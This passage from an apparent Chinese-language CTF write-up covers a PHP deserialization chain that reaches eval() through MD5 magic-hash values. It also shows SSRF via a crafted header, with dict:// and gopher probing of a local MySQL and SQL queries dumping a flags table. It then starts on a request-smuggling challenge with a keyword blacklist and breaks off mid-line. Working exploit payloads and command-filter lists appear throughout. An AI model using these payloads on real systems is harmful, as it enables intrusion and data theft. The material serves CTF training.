</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;å‰æ–¹çš„åŒºåŸŸä»¥åå†æ¥æ¢ç´¢å§ï¼&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Sword</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$go</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test1</span> <span class="o">!==</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test1</span><span class="p">)</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;æ²‰ç¡çš„åˆ©åˆƒè¢«ä½ å”¤é†’äº†ï¼Œæ˜¯æ—¶å€™å»è®¨ä¼é­”ç‹äº†ï¼&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">go</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Dead&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mon3tr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Treasure</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;åˆ°æ­¤ä¸ºæ­¢äº†ï¼é­”ç‹&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">end</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">end</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">end</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;éš¾é“â€¦â€¦è¦è¾“äº†å—ï¼Ÿ&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Treasure</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ç»“æŸäº†ï¼Ÿ&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">ishero</span> <span class="o">=</span> <span class="s2">&#34;%0ahero&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">adventure</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Sword</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">adventure</span><span class="o">-&gt;</span><span class="na">test1</span> <span class="o">=</span> <span class="s2">&#34;QNKCDZO&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">adventure</span><span class="o">-&gt;</span><span class="na">test2</span> <span class="o">=</span> <span class="s2">&#34;240610708&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">adventure</span><span class="o">-&gt;</span><span class="na">go</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mon3tr</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">adventure</span><span class="o">-&gt;</span><span class="na">go</span><span class="o">-&gt;</span><span class="na">end</span> <span class="o">=</span> <span class="s1">&#39;eval($_GET[0]);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251117200529208.png"
	width="1344"
	height="964"
	srcset="/p/qctf2025/image-20251117200529208_hu11975739603003073647.png 480w, /p/qctf2025/image-20251117200529208_hu14986264930021115066.png 1024w"
	loading="lazy"
	
		alt="image-20251117200529208"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<h3 id="android-or-apple">android or apple
</h3><h4 id="çŸ¥è¯†ç‚¹ä»£ç å®¡è®¡ssrfæ‰“sqlæ³¨å…¥">çŸ¥è¯†ç‚¹ï¼šä»£ç å®¡è®¡ã€ssrfæ‰“sqlæ³¨å…¥
</h4><p>www.zipè·å–æºç ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p>
<p><img src="/p/qctf2025/image-20251117204729822.png"
	width="282"
	height="318"
	srcset="/p/qctf2025/image-20251117204729822_hu17076059414703105840.png 480w, /p/qctf2025/image-20251117204729822_hu156264202522078868.png 1024w"
	loading="lazy"
	
		alt="image-20251117204729822"
	
	
		class="gallery-image" 
		data-flex-grow="88"
		data-flex-basis="212px"
	
></p>
<p>æ­£å¥½è¦è®­ç»ƒä»£ç å®¡è®¡çš„èƒ½åŠ›ï¼Œè¿™é‡Œç»ƒä¸€ä¸‹</p>
<p>é¦–å…ˆæ˜¯åŠŸèƒ½ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªç™»å…¥æ¡†ï¼Œæœ‰å®‰å“ç™»å…¥å’Œè‹¹æœç™»å…¥ä¹‹åˆ†ï¼Œä»”ç»†çœ‹çœ‹å°±èƒ½å‘ç°å®‰å“ç™»å…¥çš„login.phpæ ¹æœ¬æ²¡æœ‰æˆåŠŸç™»å…¥çš„åˆ¤æ–­é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯è¯´å®‰å“ç™»å…¥å°±æ˜¯æ²¡ç”¨ä»»ä½•ä½œç”¨çš„ã€‚</p>
<p>ç„¶åæ˜¯è‹¹æœç™»å…¥ï¼Œè‹¹æœç™»å…¥ä¼šè·å–ä¸€ä¸ªéªŒè¯ç ï¼Œè¿™ä¸ªéªŒè¯ç æ˜¯é€šè¿‡verify.phpå®ç°çš„ã€‚è€Œè¿™ä¸ªæ–‡ä»¶ä¸­åˆæœ‰å…¶ä»–ç±»çš„å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é“é¢˜æœ‰ç‚¹åƒjavaååºåˆ—åŒ–çš„é“¾å­ã€‚</p>
<p>ç»§ç»­çœ‹è¿™ä¸ªverify.phpï¼Œå¯ä»¥å‘ç°ä»–è°ƒç”¨äº†<code>generateAndDisplayCode</code>è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹</p>
<p><img src="/p/qctf2025/image-20251117205538680.png"
	width="1225"
	height="590"
	srcset="/p/qctf2025/image-20251117205538680_hu1540703809394683243.png 480w, /p/qctf2025/image-20251117205538680_hu16883729223925538447.png 1024w"
	loading="lazy"
	
		alt="image-20251117205538680"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªå‡½æ•°ä¸­åˆ›å»ºäº†æ–°çš„<code>\Util\ImageProcessor()</code>å¯¹è±¡ï¼Œå¹¶è°ƒç”¨äº†fetchå‡½æ•°ï¼Œå¦å¤–è¿˜è°ƒç”¨äº†<code>saveAndDisplay()</code></p>
<p><img src="/p/qctf2025/image-20251117210537367.png"
	width="1348"
	height="664"
	srcset="/p/qctf2025/image-20251117210537367_hu6177156251132303951.png 480w, /p/qctf2025/image-20251117210537367_hu4415172981160816998.png 1024w"
	loading="lazy"
	
		alt="image-20251117210537367"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="487px"
	
></p>
<p>æˆ‘ä»¬å…ˆç›´æ¥è·Ÿè¿›fetchå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°é¦–å…ˆæ˜¯urlå‚æ•°è°ƒç”¨äº†<code>getSourceUrl</code>ï¼Œç„¶åæ˜¯è°ƒç”¨äº†<code>$this-&gt;securityCheck($url);</code>æœ€åè°ƒç”¨<code>Request($url)</code>è¿”å›å€¼èµ‹ç»™<code>$img</code>ï¼Œå¦‚æœ<code>img</code>ä¸ä¸ºç©ºï¼Œå°±å¯ä»¥returnè¿™ä¸ªå‚æ•°</p>
<p><img src="/p/qctf2025/image-20251117211104056.png"
	width="1126"
	height="320"
	srcset="/p/qctf2025/image-20251117211104056_hu6589776133730152628.png 480w, /p/qctf2025/image-20251117211104056_hu603911352989183041.png 1024w"
	loading="lazy"
	
		alt="image-20251117211104056"
	
	
		class="gallery-image" 
		data-flex-grow="351"
		data-flex-basis="844px"
	
></p>
<p>ç„¶åé€ä¸€å®¡è®¡ä¸€ä¸‹è¿™å‡ ä¸ªä»£ç ï¼Œçœ‹åˆ°äº†ä¸ªssrfï¼Œç„¶ååé¢Requesté‡Œç¡®å®æœ‰å…³äºssrfçš„æ¼æ´ä»£ç ã€‚è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code> $_SERVER['HTTP_X_VERIFY_CODE_URL']</code>ä¼ å…¥æ•°æ®ï¼Œè¿™é‡Œå°±æ˜¯å…¥å£å¯ä»¥æ§åˆ¶urlæ•°æ®</p>
<p><img src="/p/qctf2025/image-20251117212929188.png"
	width="1153"
	height="338"
	srcset="/p/qctf2025/image-20251117212929188_hu5237910248211289190.png 480w, /p/qctf2025/image-20251117212929188_hu5402426881531730291.png 1024w"
	loading="lazy"
	
		alt="image-20251117212929188"
	
	
		class="gallery-image" 
		data-flex-grow="341"
		data-flex-basis="818px"
	
></p>
<p>æˆ‘ä»¬åœ¨httpå¤´é‡Œæ·»åŠ <code>X_VERIFY_CODE_URL</code>æ•°æ®ï¼Œå°±å¯ä»¥æ§åˆ¶urläº†</p>
<p>æˆ‘ä»¬å°è¯•ç”¨dickåè®®æ¢æµ‹ä¸€ä¸‹ï¼Œæ¢æµ‹åˆ°äº†æ•°æ®åº“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">X-VERIFY-CODE-URL: dict://127.0.0.1:3306
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251117223647462.png"
	width="1863"
	height="606"
	srcset="/p/qctf2025/image-20251117223647462_hu1393886838011891874.png 480w, /p/qctf2025/image-20251117223647462_hu13442415891200003311.png 1024w"
	loading="lazy"
	
		alt="image-20251117223647462"
	
	
		class="gallery-image" 
		data-flex-grow="307"
		data-flex-basis="737px"
	
></p>
<p><img src="/p/qctf2025/image-20251117223732295.png"
	width="1111"
	height="314"
	srcset="/p/qctf2025/image-20251117223732295_hu1700361107821201192.png 480w, /p/qctf2025/image-20251117223732295_hu4598522256950941999.png 1024w"
	loading="lazy"
	
		alt="image-20251117223732295"
	
	
		class="gallery-image" 
		data-flex-grow="353"
		data-flex-basis="849px"
	
></p>
<p>æ‰€ä»¥ï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨gopheråè®®æ‰“mysqlï¼ˆè¿˜æ²¡æ‰“è¿‡ï¼‰ç”¨æˆ·æ˜¯rootï¼Œç„¶åæ˜¯ä½ è¦æ‰§è¡Œçš„sqlè¯­å¥</p>
<p><img src="/p/qctf2025/image-20251117225036493.png"
	width="585"
	height="341"
	srcset="/p/qctf2025/image-20251117225036493_hu6790828550112405748.png 480w, /p/qctf2025/image-20251117225036493_hu14497722403075301155.png 1024w"
	loading="lazy"
	
		alt="image-20251117225036493"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="411px"
	
></p>
<p>è¿™é‡Œè¿˜éœ€è¦å»æ‰<code>_</code>å°±è¡Œï¼ŒåŸå› å¦‚ä¸‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œç”¨curlçš„gopheråè®®éœ€è¦<code>_</code>ä½†æ˜¯fsockopenä¸éœ€è¦</p>
<p><img src="/p/qctf2025/image-20251117225143007.png"
	width="864"
	height="279"
	srcset="/p/qctf2025/image-20251117225143007_hu13487001686924035249.png 480w, /p/qctf2025/image-20251117225143007_hu9465277873058001275.png 1024w"
	loading="lazy"
	
		alt="image-20251117225143007"
	
	
		class="gallery-image" 
		data-flex-grow="309"
		data-flex-basis="743px"
	
></p>
<p><img src="/p/qctf2025/image-20251117225058781.png"
	width="574"
	height="636"
	srcset="/p/qctf2025/image-20251117225058781_hu15697205758435371749.png 480w, /p/qctf2025/image-20251117225058781_hu14189240126787945039.png 1024w"
	loading="lazy"
	
		alt="image-20251117225058781"
	
	
		class="gallery-image" 
		data-flex-grow="90"
		data-flex-basis="216px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctf_db&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°è¡¨åflags</p>
<p><img src="/p/qctf2025/image-20251117230715339.png"
	width="704"
	height="261"
	srcset="/p/qctf2025/image-20251117230715339_hu9816720275904668823.png 480w, /p/qctf2025/image-20251117230715339_hu7377429809851108373.png 1024w"
	loading="lazy"
	
		alt="image-20251117230715339"
	
	
		class="gallery-image" 
		data-flex-grow="269"
		data-flex-basis="647px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select group_concat(column_name) from information_schema.columns where table_name=&#39;flags&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ—åä¹Ÿæ˜¯flagï¼Œå…¶å®è¿™ä¸€æ­¥éƒ½ä¸éœ€è¦ï¼Œç›´æ¥å°±è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from ctf_db.flags
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="wafwaf">waf?waf!
</h3><h4 id="çŸ¥è¯†ç‚¹httpè¯·æ±‚èµ°ç§">çŸ¥è¯†ç‚¹ï¼šhttpè¯·æ±‚èµ°ç§
</h4><p>æºç å¾ˆé•¿ï¼Œæ…¢æ…¢å®¡è®¡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">parse_qs</span><span class="p">,</span> <span class="n">urlparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unicodedata</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BLACKLIST_KEYWORDS</span> <span class="o">=</span> <span class="p">[</span>                                                                                            
</span></span><span class="line"><span class="cl"><span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;assert&#39;</span><span class="p">,</span> <span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;apply&#39;</span><span class="p">,</span> <span class="s1">&#39;locals&#39;</span><span class="p">,</span> <span class="s1">&#39;load_module&#39;</span><span class="p">,</span> <span class="s1">&#39;json.loads&#39;</span><span class="p">,</span> <span class="s1">&#39;urllib.request.urlopen&#39;</span><span class="p">,</span> <span class="s1">&#39;subprocess&#39;</span><span class="p">,</span> <span class="s1">&#39;threading&#39;</span><span class="p">,</span> <span class="s1">&#39;tempfile&#39;</span><span class="p">,</span> <span class="s1">&#39;run&#39;</span><span class="p">,</span> <span class="s1">&#39;yield&#39;</span><span class="p">,</span> <span class="s1">&#39;inspect&#39;</span><span class="p">,</span> <span class="s1">&#39;netrc&#39;</span><span class="p">,</span> <span class="s1">&#39;globals&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;urandom&#39;</span><span class="p">,</span> <span class="s1">&#39;register&#39;</span><span class="p">,</span> <span class="s1">&#39;breakpoint&#39;</span><span class="p">,</span> <span class="s1">&#39;environ&#39;</span><span class="p">,</span> <span class="s1">&#39;str.format_map&#39;</span><span class="p">,</span> <span class="s1">&#39;tarfile&#39;</span><span class="p">,</span> <span class="s1">&#39;traceback&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;listen&#39;</span><span class="p">,</span> <span class="s1">&#39;info_leak&#39;</span><span class="p">,</span> <span class="s1">&#39;vars&#39;</span><span class="p">,</span> <span class="s1">&#39;exec_hook&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;__import__&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="s1">&#39;raw_input&#39;</span><span class="p">,</span> <span class="s1">&#39;getattr&#39;</span><span class="p">,</span> <span class="s1">&#39;setattr&#39;</span><span class="p">,</span> <span class="s1">&#39;delattr&#39;</span><span class="p">,</span> <span class="s1">&#39;hasattr&#39;</span><span class="p">,</span> <span class="s1">&#39;globals&#39;</span><span class="p">,</span> <span class="s1">&#39;locals&#39;</span><span class="p">,</span> <span class="s1">&#39;vars&#39;</span><span class="p">,</span> <span class="s1">&#39;dir&#39;</span><span class="p">,</span> <span class="s1">&#39;help&#39;</span><span class="p">,</span> <span class="s1">&#39;license&#39;</span><span class="p">,</span> <span class="s1">&#39;copyright&#39;</span><span class="p">,</span> <span 